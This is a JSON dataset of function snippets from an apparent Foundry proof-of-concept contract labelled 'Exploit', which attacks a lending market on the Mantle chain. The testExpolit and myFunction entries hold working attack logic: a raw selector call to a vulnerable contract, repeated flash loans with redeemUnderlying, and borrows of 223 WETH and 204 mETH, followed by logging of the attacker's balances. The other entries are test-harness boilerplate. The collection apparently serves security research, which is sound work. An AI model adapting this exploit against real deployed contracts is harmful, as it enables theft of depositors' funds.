[
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "initializeWrapAmount",
    "original_code": "    function initializeWrapAmount(\n        uint256 initialAmount\n    ) public {\n        wrapAmount = initialAmount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "myFunction",
    "original_code": "    function myFunction(uint256 a, uint256 b, uint256 c) public {\n        uint256 i = 0;\n        initializeWrapAmount(4_265_037_756_531_702_250_012_049);\n        while (i < 24) {\n            uint256 amount = musdy.maxFlashLoan(address(usdy));\n            musdy.flashLoan(IERC3156FlashBorrower(address(this)), address(usdy), amount, \"\");\n            musdy.redeemUnderlying(4_265_817_792_016_953_140_101_195);\n            i++;\n        }\n        usdy.transfer(address(msg.sender), 4_265_817_792_016_953_140_101_195);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32);\n}\n\ninterface Musdy is IERC20 {\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"https://rpc.mantle.xyz\", 66_416_576);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExpolit",
    "original_code": "    function testExpolit() public {\n        usdy.approve(address(musdy), type(uint256).max);\n        usdy.approve(address(musd), type(uint256).max);\n        musd.approve(address(musdy), type(uint256).max);\n        musdy.approve(address(musdy), type(uint256).max);\n        address[] memory addressArray = new address[](1);\n        addressArray[0] = address(musdy);\n        address(Proxy).call(abi.encodeWithSignature(\"enableAsCollateral(address[])\", addressArray));\n        address(vulncontract).call(\n            abi.encodeWithSelector(bytes4(0x490e6cbc), address(this), 0, 4_265_391_252_891_663_973_703_824, \"\")\n        );\n        // emit log_named_decimal_uint(\"[End] Attacker musdy balance after exploit\", musdy.balanceOf(address(this)), musdy.decimals());\n        mWETH.borrow(223 ether);\n        mMETH.borrow(204 ether);\n        emit log_named_decimal_uint(\n            \"[End] Attacker musdy balance after exploit\", musdy.balanceOf(address(this)), musdy.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker mETH balance after exploit\", mETH.balanceOf(address(this)), mETH.decimals()\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "wrapAmount",
    "original_code": "",
    "description": ""
  }
]